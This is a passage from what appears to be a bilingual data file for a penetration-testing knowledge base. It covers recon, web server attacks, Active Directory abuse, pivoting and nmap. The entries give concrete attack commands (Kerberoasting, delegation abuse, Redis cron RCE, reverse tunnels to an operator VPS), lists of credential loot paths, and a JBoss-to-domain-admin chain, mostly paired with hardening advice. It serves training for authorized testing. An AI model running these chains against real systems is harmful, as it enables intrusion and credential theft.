  <li><strong>21 FTP.</strong> Anonymous-Read zuerst, Banner zweitens. Beschreibbare Verzeichnisse prüfen.</li>
  <li><strong>22 SSH.</strong> Banner verrät OS-Familie; <code>ssh-audit</code> für KEX-/MAC-Haltung; Userlist-Enum via Timing auf altem OpenSSH.</li>
  <li><strong>445 SMB.</strong> <code>crackmapexec smb</code> für Null-Session, Signing, OS-Version, Share-Enum.</li>
  <li><strong>389/636 LDAP.</strong> Anonymous-Bind zuerst; Root-DSE für Naming Context; userPrincipalName-Enumeration.</li>
  <li><strong>1433 MSSQL.</strong> <code>mssqlclient.py -windows-auth</code> mit gesprayten Creds; <code>xp_cmdshell</code> wenn sysadmin.</li>
  <li><strong>3389 RDP.</strong> <code>nmap --script rdp-enum-encryption</code> für NLA-Haltung; niemals brute-forcen ohne bestätigte Lockout-Policy.</li>
  <li><strong>5985/5986 WinRM.</strong> <code>evil-winrm</code> mit gesprayten Creds. Wenn Admin, hast du eine Shell ohne AV-berührenden Binary.</li>
  <li><strong>6379 Redis.</strong> Default unauthentifiziert. <code>config set dir /var/spool/cron/</code> + crontab-Write für RCE.</li>
  <li><strong>27017 MongoDB.</strong> Unauthentifiziert in Default-Docker-Images. <code>mongosh</code> + show dbs.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Der billigste Find des Engagements steckt meist in der Recon-Phase. Die Zeit investieren. Eine Subdomain, von der niemand im Security-Team weiß, ist mehr wert als drei exotische Exploits gegen eine gehärtete Haupt-App.</div>
`
    ),
    phases: ["recon", "osint", "fingerprint"]
  },
  {
    id: "web-server-attack-defense",
    domain: "offensive-tradecraft", tier: 1,
    title: T("Web Server — Attack & Defense", "Web Server — Angriff & Verteidigung"),
    blurb: T(
      "Per-server-class attack chains paired with the corresponding hardening — Apache, nginx, IIS, Tomcat, JBoss — and the decision tree from first 200 OK to authenticated context.",
      "Angriffsketten pro Server-Klasse mit zugehörigen Härtungsmaßnahmen — Apache, nginx, IIS, Tomcat, JBoss — und der Entscheidungsbaum vom ersten 200 OK bis zum authentifizierten Kontext."
    ),
    body: B(
      `
<h2>Apache HTTPD</h2>
<ul>
  <li><strong>Attack.</strong> <code>.htaccess</code> abuse where AllowOverride permits SetHandler — drop a PHP handler in a writable upload dir for instant RCE. <code>mod_cgi</code> + CVE-2021-41773 path traversal still reachable on stragglers. <code>mod_status</code> at <code>/server-status</code> leaks live request URIs including auth tokens.</li>
  <li><strong>Defense.</strong> <code>AllowOverride None</code> globally. Disable mod_status or restrict to loopback. Patch above 2.4.50 and audit <code>Directory</code> aliases for traversal escape.</li>
</ul>

<h2>nginx</h2>
<ul>
  <li><strong>Attack.</strong> Off-by-slash misconfig: <code>location /api { proxy_pass http://backend; }</code> with request <code>/api../admin</code> normalizes server-side. Header injection via <code>proxy_set_header X-Real-IP $http_x_forwarded_for</code>. Lua-module sandbox escape on old OpenResty.</li>
  <li><strong>Defense.</strong> Trailing slash discipline: <code>location /api/ { proxy_pass http://backend/; }</code>. Strip <code>$http_*</code> headers that the backend trusts. Pin OpenResty if you use it; track its CVE feed separately from nginx-core.</li>
</ul>

<h2>IIS / ASP.NET</h2>
<ul>
  <li><strong>Attack.</strong> WebDAV PUT to writable virtual dir; <code>.config</code> overwrite to swap handlers. Unicode normalization (<code>%c0%af</code>) for traversal on legacy installs. ViewState deserialization where machineKey is leaked or default.</li>
  <li><strong>Defense.</strong> Disable WebDAV unless required, restrict verbs. Set <code>requestFiltering</code> to block <code>..</code> sequences. Rotate <code>machineKey</code>, ensure validation/decryption keys are not default.</li>
</ul>

<h2>Tomcat / JBoss / WildFly</h2>
<ul>
  <li><strong>Attack.</strong> <code>/manager/html</code> with default creds (<code>tomcat:tomcat</code>, <code>admin:admin</code>) → WAR deploy → JSP shell. JMX-Console / Admin-Console on JBoss legacy → invoker-servlet → deserialization. RMI port 1099 still externally exposed in misconfigured deploys.</li>
  <li><strong>Defense.</strong> Remove manager/admin apps from production builds. If required, bind to loopback and restrict by IP + strong creds. Disable JMX remote unless explicitly needed; never on a public interface.</li>
</ul>

<h2>Decision tree from first 200 OK</h2>
<ol>
  <li><strong>Tech identified?</strong> If yes → consult banner→CVE list. If no → fingerprint more (favicon, error pages, behavioral probes).</li>
  <li><strong>Auth surface visible?</strong> Login form, basic auth, NTLM → spray known weak credentials (<code>kerbrute</code>, <code>hydra</code>) within lockout policy.</li>
  <li><strong>Admin panel reachable?</strong> Default creds first, then known CVE for that panel, then password-recovery logic flaws.</li>
  <li><strong>No auth, static-ish app?</strong> Directory fuzz (<code>ffuf -w raft-large -e .bak,.old,.zip,.txt</code>) for backup files, source leaks, config dumps.</li>
  <li><strong>API endpoint?</strong> Look for <code>/api/v1</code>, <code>/api/v2</code>, <code>/swagger</code>, <code>/openapi.json</code>, <code>/graphql</code> + introspection. Test mass assignment, IDOR, JWT confusion.</li>
</ol>
<div class="rs-rule"><strong>Rule of thumb</strong>Never deploy management interfaces (Tomcat manager, JBoss admin, Confluence admin) on a public interface, regardless of password strength. Network-layer restriction defeats entire classes of attack that password rotation cannot.</div>
`,
      `
<h2>Apache HTTPD</h2>
<ul>
  <li><strong>Angriff.</strong> <code>.htaccess</code>-Missbrauch wo AllowOverride SetHandler erlaubt — PHP-Handler in beschreibbaren Upload-Ordner droppen für sofortige RCE. <code>mod_cgi</code> + CVE-2021-41773 Path-Traversal noch auf Nachzüglern erreichbar. <code>mod_status</code> unter <code>/server-status</code> leakt Live-Request-URIs inklusive Auth-Tokens.</li>
  <li><strong>Verteidigung.</strong> Global <code>AllowOverride None</code>. mod_status deaktivieren oder auf Loopback beschränken. Über 2.4.50 patchen und <code>Directory</code>-Aliasse auf Traversal-Escape auditieren.</li>
</ul>

<h2>nginx</h2>
<ul>
  <li><strong>Angriff.</strong> Off-by-Slash-Misconfig: <code>location /api { proxy_pass http://backend; }</code> mit Request <code>/api../admin</code> normalisiert server-seitig. Header-Injection via <code>proxy_set_header X-Real-IP $http_x_forwarded_for</code>. Lua-Modul-Sandbox-Escape auf altem OpenResty.</li>
  <li><strong>Verteidigung.</strong> Trailing-Slash-Disziplin: <code>location /api/ { proxy_pass http://backend/; }</code>. <code>$http_*</code>-Header strippen, denen das Backend traut. OpenResty pinnen wenn genutzt; CVE-Feed separat vom nginx-Core verfolgen.</li>
</ul>

<h2>IIS / ASP.NET</h2>
<ul>
  <li><strong>Angriff.</strong> WebDAV PUT in beschreibbares Virtual-Dir; <code>.config</code>-Overwrite zum Handler-Swap. Unicode-Normalisierung (<code>%c0%af</code>) für Traversal auf Legacy-Installationen. ViewState-Deserialisierung wo machineKey geleakt oder Default ist.</li>
  <li><strong>Verteidigung.</strong> WebDAV deaktivieren wenn nicht benötigt, Verben einschränken. <code>requestFiltering</code> auf Block von <code>..</code>-Sequenzen. <code>machineKey</code> rotieren, validation-/decryption-Keys nicht default.</li>
</ul>

<h2>Tomcat / JBoss / WildFly</h2>
<ul>
  <li><strong>Angriff.</strong> <code>/manager/html</code> mit Default-Creds (<code>tomcat:tomcat</code>, <code>admin:admin</code>) → WAR-Deploy → JSP-Shell. JMX-Console / Admin-Console auf JBoss-Legacy → Invoker-Servlet → Deserialisierung. RMI-Port 1099 noch extern exponiert in Misconfig-Deploys.</li>
  <li><strong>Verteidigung.</strong> Manager-/Admin-Apps aus Produktions-Builds entfernen. Falls nötig, auf Loopback binden und nach IP + starken Creds einschränken. JMX-Remote deaktivieren wenn nicht explizit benötigt; niemals auf öffentlichem Interface.</li>
</ul>

<h2>Entscheidungsbaum ab erstem 200 OK</h2>
<ol>
  <li><strong>Tech identifiziert?</strong> Wenn ja → Banner→CVE-Liste konsultieren. Wenn nein → weiter fingerprinten (Favicon, Error-Pages, Verhaltensproben).</li>
  <li><strong>Auth-Oberfläche sichtbar?</strong> Login-Form, Basic Auth, NTLM → bekannte schwache Credentials sprayen (<code>kerbrute</code>, <code>hydra</code>) innerhalb der Lockout-Policy.</li>
  <li><strong>Admin-Panel erreichbar?</strong> Default-Creds zuerst, dann bekannte CVE für das Panel, dann Password-Recovery-Logikfehler.</li>
  <li><strong>Keine Auth, statisch-artige App?</strong> Directory-Fuzz (<code>ffuf -w raft-large -e .bak,.old,.zip,.txt</code>) für Backup-Files, Source-Leaks, Config-Dumps.</li>
  <li><strong>API-Endpunkt?</strong> Suche nach <code>/api/v1</code>, <code>/api/v2</code>, <code>/swagger</code>, <code>/openapi.json</code>, <code>/graphql</code> + Introspection. Mass-Assignment, IDOR, JWT-Confusion testen.</li>
</ol>
<div class="rs-rule"><strong>Faustregel</strong>Management-Interfaces (Tomcat Manager, JBoss Admin, Confluence Admin) niemals auf öffentlichem Interface deployen, unabhängig von der Passwortstärke. Netzwerk-Restriktion schlägt ganze Angriffsklassen, die Passwort-Rotation nicht schafft.</div>
`
    ),
    phases: ["fingerprint", "cmd-injection", "recon", "auth"]
  },
  {
    id: "active-directory-pentest",
    domain: "offensive-tradecraft", tier: 1,
    title: T("Active Directory Pentest", "Active Directory Pentest"),
    blurb: T(
      "AD attack surface end-to-end: enumeration, Kerberos, ACL abuse, GPO weaponization, the Tier-0 chase — including the internal-engagement playbook from foothold to domain dominance.",
      "Active Directory von A bis Z: Enumeration, Kerberos, ACL-Missbrauch, GPO-Waffenbau, Jagd auf Tier 0 — inklusive Playbook für interne Engagements vom Foothold bis zur Domain Dominance."
    ),
    body: B(
      `
<h2>Enumeration (any authenticated user)</h2>
<ul>
  <li><strong>BloodHound collection.</strong> <code>SharpHound -c All,GPOLocalGroup</code> from a domain-joined host; or <code>bloodhound-python -c All -u user -p pass -d domain.local -ns DC_IP</code> from Linux. Always run with <code>--ldapfilter</code> to scope under heavy environments.</li>
  <li><strong>User and computer enum.</strong> <code>ldapsearch -x -h DC -b "dc=domain,dc=local" "(objectClass=user)"</code>. Look for description fields containing passwords — still the single most common AD finding.</li>
  <li><strong>SPN inventory.</strong> <code>setspn -Q */*</code> or <code>GetUserSPNs.py</code>. Service accounts here are kerberoast candidates.</li>
  <li><strong>GPO inspection.</strong> <code>Get-GPO -All</code>, walk <code>\\\\domain\\SYSVOL\\domain\\Policies\\</code> for <code>cpassword</code> in Groups.xml (GPP creds, decryptable).</li>
</ul>

<h2>Kerberos abuse</h2>
<ol>
  <li><strong>Kerberoasting.</strong> <code>Rubeus.exe kerberoast /outfile:hashes.txt</code> or <code>GetUserSPNs.py -request</code>. Crack hashcat mode 13100 with <code>rockyou + best64.rule</code>. Service accounts with passwords &lt; 14 chars typically fall.</li>
  <li><strong>ASREP-roasting.</strong> <code>Rubeus.exe asreproast</code> or <code>GetNPUsers.py -no-pass -usersfile users.txt</code> for accounts with <code>DONT_REQUIRE_PREAUTH</code>. Hashcat mode 18200.</li>
  <li><strong>Unconstrained delegation abuse.</strong> Computer accounts with TRUSTED_FOR_DELEGATION → coerce DC auth via <code>PetitPotam</code> or printer bug → captured TGT.</li>
  <li><strong>Constrained delegation (S4U2Self/Proxy).</strong> Computer/user with <code>msDS-AllowedToDelegateTo</code> → request TGS as any user to the configured SPN → <code>Rubeus.exe s4u /user:WEB$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01</code>.</li>
  <li><strong>Resource-based constrained delegation.</strong> Write access to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on a target computer → add attacker-controlled machine account → impersonate any user to that target.</li>
</ol>

<h2>ACL abuse — dangerous rights</h2>
<ul>
  <li><strong>GenericAll on user.</strong> Reset password or set SPN → kerberoast.</li>
  <li><strong>WriteDACL on object.</strong> Grant self GenericAll → all of the above.</li>
  <li><strong>WriteOwner.</strong> Take ownership → WriteDACL → GenericAll.</li>
  <li><strong>ForceChangePassword on user.</strong> <code>Set-DomainUserPassword</code> (PowerView). Loud but fast.</li>
  <li><strong>AddMember on group.</strong> Especially Domain Admins, Enterprise Admins, Schema Admins, and any tier-0 group.</li>
  <li><strong>GenericWrite on computer.</strong> Set RBCD on target → impersonate any user via S4U.</li>
</ul>

<h2>Defenses</h2>
<ul>
  <li><strong>gMSAs for service accounts.</strong> 240-byte rotated passwords defeat kerberoasting categorically.</li>
  <li><strong>PRE_AUTH required on every account.</strong> Audit <code>(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code> regularly.</li>
  <li><strong>Tier-0 isolation.</strong> Domain Admins log in only from PAWs. No Tier-0 secret ever cached on a Tier-1 host.</li>
  <li><strong>LDAP signing + channel binding.</strong> Defeats relay attacks against DCs.</li>
  <li><strong>SMB signing required.</strong> Defeats NTLM relay across the file-server fleet.</li>
  <li><strong>Disable spooler service on every DC.</strong> Removes the printer-bug delegation primitive.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Path to DA is almost always shorter in BloodHound than you'd expect. Run it on day one of any internal engagement, before any other tooling. The graph tells you which 3–4 of the next 50 things to try.</div>
`,
      `
<h2>Enumeration (jeder authentifizierte User)</h2>
<ul>
  <li><strong>BloodHound-Collection.</strong> <code>SharpHound -c All,GPOLocalGroup</code> von einem domain-joined Host; oder <code>bloodhound-python -c All -u user -p pass -d domain.local -ns DC_IP</code> von Linux. In großen Umgebungen immer mit <code>--ldapfilter</code> scopen.</li>
  <li><strong>User- und Computer-Enum.</strong> <code>ldapsearch -x -h DC -b "dc=domain,dc=local" "(objectClass=user)"</code>. Description-Felder mit Passwörtern suchen — noch immer der häufigste AD-Befund.</li>
  <li><strong>SPN-Inventur.</strong> <code>setspn -Q */*</code> oder <code>GetUserSPNs.py</code>. Service-Accounts hier sind Kerberoast-Kandidaten.</li>
  <li><strong>GPO-Inspektion.</strong> <code>Get-GPO -All</code>, <code>\\\\domain\\SYSVOL\\domain\\Policies\\</code> nach <code>cpassword</code> in Groups.xml durchsuchen (GPP-Creds, entschlüsselbar).</li>
</ul>

<h2>Kerberos-Missbrauch</h2>
<ol>
  <li><strong>Kerberoasting.</strong> <code>Rubeus.exe kerberoast /outfile:hashes.txt</code> oder <code>GetUserSPNs.py -request</code>. Mit hashcat-Modus 13100 cracken, <code>rockyou + best64.rule</code>. Service-Accounts mit Passwörtern &lt; 14 Zeichen fallen typischerweise.</li>
  <li><strong>ASREP-Roasting.</strong> <code>Rubeus.exe asreproast</code> oder <code>GetNPUsers.py -no-pass -usersfile users.txt</code> für Accounts mit <code>DONT_REQUIRE_PREAUTH</code>. Hashcat-Modus 18200.</li>
  <li><strong>Unconstrained-Delegation-Missbrauch.</strong> Computer-Accounts mit TRUSTED_FOR_DELEGATION → DC-Auth via <code>PetitPotam</code> oder Printer-Bug coerce → erbeutetes TGT.</li>
  <li><strong>Constrained Delegation (S4U2Self/Proxy).</strong> Computer/User mit <code>msDS-AllowedToDelegateTo</code> → TGS als beliebiger User für den konfigurierten SPN anfordern → <code>Rubeus.exe s4u /user:WEB$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01</code>.</li>
  <li><strong>Resource-Based Constrained Delegation.</strong> Schreibzugriff auf <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> am Ziel-Computer → angreifer-kontrolliertes Machine-Account hinzufügen → beliebigen User zu diesem Ziel impersonieren.</li>
</ol>

<h2>ACL-Missbrauch — gefährliche Rechte</h2>
<ul>
  <li><strong>GenericAll auf User.</strong> Passwort zurücksetzen oder SPN setzen → kerberoasten.</li>
  <li><strong>WriteDACL auf Objekt.</strong> Self GenericAll gewähren → alles oben.</li>
  <li><strong>WriteOwner.</strong> Ownership übernehmen → WriteDACL → GenericAll.</li>
  <li><strong>ForceChangePassword auf User.</strong> <code>Set-DomainUserPassword</code> (PowerView). Laut, aber schnell.</li>
  <li><strong>AddMember auf Gruppe.</strong> Speziell Domain Admins, Enterprise Admins, Schema Admins und jede Tier-0-Gruppe.</li>
  <li><strong>GenericWrite auf Computer.</strong> RBCD am Ziel setzen → beliebigen User via S4U impersonieren.</li>
</ul>

<h2>Verteidigung</h2>
<ul>
  <li><strong>gMSAs für Service-Accounts.</strong> 240-Byte rotierte Passwörter schlagen Kerberoasting kategorisch.</li>
  <li><strong>PRE_AUTH auf jedem Account erforderlich.</strong> Regelmäßig <code>(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code> auditieren.</li>
  <li><strong>Tier-0-Isolation.</strong> Domain Admins loggen sich nur von PAWs ein. Kein Tier-0-Secret je auf einem Tier-1-Host gecacht.</li>
  <li><strong>LDAP-Signing + Channel-Binding.</strong> Schlägt Relay-Angriffe gegen DCs.</li>
  <li><strong>SMB-Signing erforderlich.</strong> Schlägt NTLM-Relay über die File-Server-Flotte.</li>
  <li><strong>Spooler-Service auf jedem DC deaktivieren.</strong> Entfernt das Printer-Bug-Delegation-Primitiv.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Der Weg zu DA ist in BloodHound fast immer kürzer als erwartet. An Tag eins jedes Internal-Engagements laufen lassen, vor jedem anderen Tooling. Der Graph sagt dir, welche 3–4 der nächsten 50 Dinge zu probieren sind.</div>
`
    ),
    phases: ["recon", "auth", "fingerprint", "biz-logic"]
  },
  {
    id: "internal-pivoting",
    domain: "offensive-tradecraft", tier: 1,
    title: T("Internal Pivoting & Lateral Movement", "Internal Pivoting & Lateral Movement"),
    blurb: T(
      "Tunnel topologies, port-forwarding patterns, the handoff from web compromise to internal foothold, and a worked JBoss-to-domain case.",
      "Tunnel-Topologien, Port-Forwarding-Muster, der Übergang vom Web-Kompromiss zum internen Foothold und ein durchgespielter JBoss-zu-Domain-Fall."
    ),
    body: B(
      `
<h2>Tunnel topologies — pick the right one</h2>
<ul>
  <li><strong>SOCKS over SSH.</strong> <code>ssh -D 1080 user@foothold</code> + <code>proxychains</code>. Default choice when the foothold has SSH and the network allows outbound 22 to your VPS. Latency is fine, throughput is fine, single TCP session.</li>
  <li><strong>chisel.</strong> When SSH isn't reachable: <code>chisel server -p 8080 --reverse</code> on your VPS, <code>chisel client VPS:8080 R:1080:socks</code> on the foothold. HTTP/WebSocket transport survives most egress filtering.</li>
  <li><strong>ligolo-ng.</strong> Best for double-pivot and TCP/UDP both. Creates a TUN interface on the operator side — you talk to <code>10.x.x.x</code> as if you were on that segment, no proxychains needed.</li>
  <li><strong>Reverse port forward through SSH.</strong> <code>ssh -R 8443:internal-target:443 user@foothold</code> when you need a single TCP service exposed back to your side. Smaller blast radius than a full SOCKS pivot.</li>
</ul>

<h2>Keeping a shell alive on a flaky link</h2>
<ul>
  <li><strong>TCP keepalives.</strong> <code>ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3</code>. Detects dead links in ~3 minutes instead of waiting for the kernel.</li>
  <li><strong>tmux on the foothold.</strong> Reattach after disconnect: <code>tmux new -s op</code> first session, <code>tmux attach -t op</code> after reconnect. Same applies inside Meterpreter via <code>screen</code>.</li>
  <li><strong>mosh as a fallback.</strong> UDP-based; survives IP changes (notebook on flaky Wi-Fi → tethered → back). UDP often blocked egress, so plan for it not always working.</li>
  <li><strong>autossh for unattended links.</strong> <code>autossh -M 0 -f -N -R 8443:internal:443 user@foothold</code> with keepalives — reconnects within seconds of link recovery.</li>
</ul>

<h2>Web → internal handoff</h2>
<ol>
  <li><strong>Confirm the web-app can reach internal.</strong> Try <code>http://internal-host</code> from within the web context. If yes → SSRF-style pivoting without needing shell.</li>
  <li><strong>Get a foothold shell.</strong> Webshell, deserialization payload, RCE chain. Prefer in-memory over disk; prefer over named-pipe over socket if EDR is present.</li>
  <li><strong>Establish persistent egress.</strong> chisel reverse-mode over 443 (looks like HTTPS), or DNS-over-HTTPS for the strictest egress filtering.</li>
  <li><strong>Switch to pivot tunnel immediately.</strong> Drop the webshell as primary; switch to the tunnel for further work. Webshells are noisy; tunnels are quiet.</li>
  <li><strong>Loot the foothold once.</strong> <code>/etc/passwd</code>, <code>~/.ssh/</code>, <code>~/.aws/</code>, <code>~/.kube/</code>, environment variables, recent shell history, cron, systemd timers, .bash_history. Then move.</li>
</ol>

<h2>Worked chain — JBoss to DA</h2>
<ol>
  <li><strong>Foothold.</strong> JBoss JMX-Console deserialization (ysoserial CommonsCollections5) → shell as <code>jboss</code> on app01.</li>
  <li><strong>Local loot.</strong> <code>/opt/jboss/standalone/configuration/</code> has DB creds in plaintext XML. <code>/etc/sssd/</code> reveals domain join.</li>
  <li><strong>SMB enumeration.</strong> <code>impacket-smbclient</code> with sssd-cached creds → readable share on fileserver01 contains a PowerShell script.</li>
  <li><strong>Credential in the script.</strong> Hardcoded <code>$cred = New-Object PSCredential("svc_backup", $pw)</code>. svc_backup is in Backup Operators.</li>
  <li><strong>Backup Operators → DC.</strong> Backup Operators can read <code>ntds.dit</code> via shadow copy. <code>vssadmin create shadow</code> on DC via WinRM, <code>copy</code>, <code>secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</code>.</li>
  <li><strong>Krbtgt hash → Golden Ticket.</strong> Domain compromise complete. Pause and notify white cell.</li>
</ol>
<div class="rs-rule"><strong>Rule of thumb</strong>Two tunnel layers maximum unless you really need three. Each layer roughly doubles latency and triples the surface for an operator mistake. If you're chaining four hops, stop and find a better foothold first.</div>
`,
      `
<h2>Tunnel-Topologien — die richtige wählen</h2>
<ul>
  <li><strong>SOCKS über SSH.</strong> <code>ssh -D 1080 user@foothold</code> + <code>proxychains</code>. Standardwahl wenn der Foothold SSH hat und das Netz Outbound 22 zu deinem VPS erlaubt. Latenz okay, Durchsatz okay, eine TCP-Session.</li>
  <li><strong>chisel.</strong> Wenn SSH nicht erreichbar: <code>chisel server -p 8080 --reverse</code> auf deinem VPS, <code>chisel client VPS:8080 R:1080:socks</code> auf dem Foothold. HTTP-/WebSocket-Transport übersteht meiste Egress-Filter.</li>
  <li><strong>ligolo-ng.</strong> Am besten für Double-Pivot und TCP/UDP zugleich. Erstellt ein TUN-Interface auf Operator-Seite — du sprichst mit <code>10.x.x.x</code> als wärst du auf dem Segment, kein proxychains nötig.</li>
  <li><strong>Reverse-Port-Forward über SSH.</strong> <code>ssh -R 8443:internal-target:443 user@foothold</code> wenn ein einzelner TCP-Service zurück exponiert werden muss. Kleinerer Blast-Radius als ein voller SOCKS-Pivot.</li>
</ul>

<h2>Eine Shell auf instabilem Link halten</h2>
<ul>
  <li><strong>TCP-Keepalives.</strong> <code>ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3</code>. Erkennt tote Links in ~3 Minuten statt auf den Kernel zu warten.</li>
  <li><strong>tmux auf dem Foothold.</strong> Nach Disconnect reattachen: <code>tmux new -s op</code> erste Session, <code>tmux attach -t op</code> nach Reconnect. Gleiches in Meterpreter via <code>screen</code>.</li>
  <li><strong>mosh als Fallback.</strong> UDP-basiert; übersteht IP-Wechsel (Notebook auf flackerndem Wi-Fi → tethered → zurück). UDP ist oft Egress geblockt, also einkalkulieren, dass es nicht immer geht.</li>
  <li><strong>autossh für unbeaufsichtigte Links.</strong> <code>autossh -M 0 -f -N -R 8443:internal:443 user@foothold</code> mit Keepalives — reconnected innerhalb von Sekunden nach Link-Wiederherstellung.</li>
</ul>

<h2>Web → Internal-Übergang</h2>
<ol>
  <li><strong>Web-App-Erreichbarkeit zu Internal bestätigen.</strong> <code>http://internal-host</code> aus dem Web-Kontext heraus probieren. Wenn ja → SSRF-style Pivoting ohne Shell nötig.</li>
  <li><strong>Foothold-Shell holen.</strong> Webshell, Deserialisierungs-Payload, RCE-Kette. In-Memory bevorzugen vor Disk; Named-Pipe vor Socket wenn EDR aktiv.</li>
  <li><strong>Persistenten Egress etablieren.</strong> chisel Reverse-Mode über 443 (sieht aus wie HTTPS), oder DNS-over-HTTPS für strengstes Egress-Filtering.</li>
  <li><strong>Sofort auf Pivot-Tunnel umschalten.</strong> Webshell als Primär fallenlassen; auf Tunnel für weitere Arbeit umschalten. Webshells sind laut; Tunnel sind leise.</li>
  <li><strong>Foothold einmal looten.</strong> <code>/etc/passwd</code>, <code>~/.ssh/</code>, <code>~/.aws/</code>, <code>~/.kube/</code>, Umgebungsvariablen, Recent Shell History, cron, systemd-Timers, .bash_history. Dann weiter.</li>
</ol>

<h2>Durchgespielte Kette — JBoss zu DA</h2>
<ol>
  <li><strong>Foothold.</strong> JBoss-JMX-Console-Deserialisierung (ysoserial CommonsCollections5) → Shell als <code>jboss</code> auf app01.</li>
  <li><strong>Lokales Loot.</strong> <code>/opt/jboss/standalone/configuration/</code> hat DB-Creds in Klartext-XML. <code>/etc/sssd/</code> zeigt Domain-Join.</li>
  <li><strong>SMB-Enumeration.</strong> <code>impacket-smbclient</code> mit sssd-gecachten Creds → lesbarer Share auf fileserver01 enthält ein PowerShell-Skript.</li>
  <li><strong>Credential im Skript.</strong> Hardcodiert <code>$cred = New-Object PSCredential("svc_backup", $pw)</code>. svc_backup ist in Backup Operators.</li>
  <li><strong>Backup Operators → DC.</strong> Backup Operators kann <code>ntds.dit</code> via Shadow Copy lesen. <code>vssadmin create shadow</code> auf DC via WinRM, <code>copy</code>, <code>secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</code>.</li>
  <li><strong>Krbtgt-Hash → Golden Ticket.</strong> Domain-Kompromittierung komplett. Pause und White Cell informieren.</li>
</ol>
<div class="rs-rule"><strong>Faustregel</strong>Maximal zwei Tunnel-Layer, außer du brauchst wirklich drei. Jeder Layer verdoppelt Latenz und verdreifacht die Oberfläche für Operator-Fehler. Wenn du vier Hops verkettet, stoppen und erst einen besseren Foothold suchen.</div>
`
    ),
    phases: ["fingerprint", "auth", "deserialization", "methodology"]
  },
  {
    id: "recon-tooling",
    domain: "offensive-tradecraft", tier: 2,
    title: T("Recon Tooling — Operator Reference", "Recon-Tooling — Operator-Referenz"),
    blurb: T(
      "nmap scan templates by goal, transform-driven entity discovery in Maltego, and the timing-vs-stealth tradeoffs that decide when to use what.",
      "nmap-Scan-Templates nach Ziel, transformgetriebene Entity-Discovery in Maltego und die Timing-vs-Stealth-Trade-offs, die entscheiden, wann was eingesetzt wird."
    ),
    body: B(
      `
<h2>nmap — scan templates by goal</h2>
<ul>
  <li><strong>Breadth (find live hosts in /24).</strong> <code>nmap -sn -PE -PP -PS80,443,22 -PA80,443 10.0.0.0/24</code>. ICMP echo + timestamp + TCP-SYN + TCP-ACK probes to defeat host-level firewalls that drop one.</li>
  <li><strong>Depth (full TCP enumeration on a target).</strong> <code>nmap -p- -sS -sV -sC --min-rate=1000 -oN out.txt target</code>. All 65535 ports, syn-scan, version detection, default scripts. Plan for 10–20 min per target.</li>
  <li><strong>Stealth (assume monitored network).</strong> <code>nmap -sS -T2 -f --data-length 24 --top-ports 100 target</code>. Slow timing, fragment packets, randomized payload length, top 100 ports only.</li>
  <li><strong>Version-pinning a service.</strong> <code>nmap -sV --version-intensity 9 -p 443 target</code>. Forces every probe, useful when default version detection returns "tcpwrapped" or blank.</li>
  <li><strong>NSE for a specific service.</strong> <code>nmap --script "smb-vuln*" -p 445 target</code> (or <code>http-*</code>, <code>ssl-*</code>, <code>ldap-*</code>). Filter NSE categories — never run <code>--script all</code> against production.</li>
  <li><strong>UDP, when you must.</strong> <code>nmap -sU --top-ports 30 -T4 target</code>. UDP is slow and unreliable; scope to known interesting ports (53, 161, 500, 4500, 5353).</li>
</ul>

<h2>Per-phase nmap recipes</h2>
<ul>
  <li><strong>Initial recon.</strong> <code>masscan -p1-65535 --rate 10000</code> to find open ports across the range, then <code>nmap -sV -sC</code> against the discovered set. Two-stage scan saves hours.</li>
  <li><strong>Authenticated context (post-foothold).</strong> <code>nmap -sn 10.0.0.0/8</code> for adjacent-segment discovery. Run from the pivot host, not from external. ICMP-only to stay quiet.</li>
  <li><strong>Post-exploitation enum.</strong> <code>nmap --script smb-enum-shares,smb-enum-users --script-args smbusername=u,smbpassword=p target</code>. Authenticated NSE produces enumeration that anonymous scans miss.</li>
</ul>

<h2>Maltego — transform chains</h2>
<ul>
  <li><strong>People → infrastructure.</strong> Domain → DNS A records → IP → ASN → all other domains in that ASN. Surfaces hidden second-brand and acquired-company assets.</li>
  <li><strong>People → social graph.</strong> Name → LinkedIn profile → coworkers → emails (via Hunter/Apollo transform) → password-spray candidate list.</li>
  <li><strong>Email → breach data.</strong> Email → HaveIBeenPwned breach list → password patterns from public dumps (legal scope only). Critical for password-spray realism.</li>
  <li><strong>Infrastructure → certificate-transparency.</strong> Domain → CT log entries → all historical certs → all subdomains ever issued. Catches assets that DNS-bruteforce misses.</li>
</ul>

<h2>Curation discipline</h2>
<ul>
  <li><strong>Triage before report.</strong> Maltego graphs grow unbounded; the deliverable is the trimmed subgraph that supports a specific finding, not the raw output.</li>
  <li><strong>Confidence per entity.</strong> Mark guessed vs. confirmed in node metadata. Without this, reviewers later can't separate fact from inference.</li>
  <li><strong>Re-run before each engagement phase.</strong> Recon outputs go stale fast. CT logs from last week miss this week's new certs.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>If a nmap scan takes longer than you budgeted, kill it and run with <code>--top-ports</code> first. You can always go deeper after you've seen the top-port output. Long blind full-port scans burn detection time without yielding new information.</div>
`,
      `
<h2>nmap — Scan-Templates nach Ziel</h2>
<ul>
  <li><strong>Breite (Live-Hosts im /24 finden).</strong> <code>nmap -sn -PE -PP -PS80,443,22 -PA80,443 10.0.0.0/24</code>. ICMP-Echo + Timestamp + TCP-SYN + TCP-ACK-Probes, um Host-Level-Firewalls zu schlagen, die einen droppen.</li>
  <li><strong>Tiefe (volle TCP-Enumeration auf einem Ziel).</strong> <code>nmap -p- -sS -sV -sC --min-rate=1000 -oN out.txt target</code>. Alle 65535 Ports, Syn-Scan, Version-Detection, Default-Scripts. 10–20 min pro Ziel einkalkulieren.</li>
  <li><strong>Stealth (überwachtes Netz angenommen).</strong> <code>nmap -sS -T2 -f --data-length 24 --top-ports 100 target</code>. Slow Timing, Fragmentierung, randomisierte Payload-Länge, Top-100-Ports.</li>
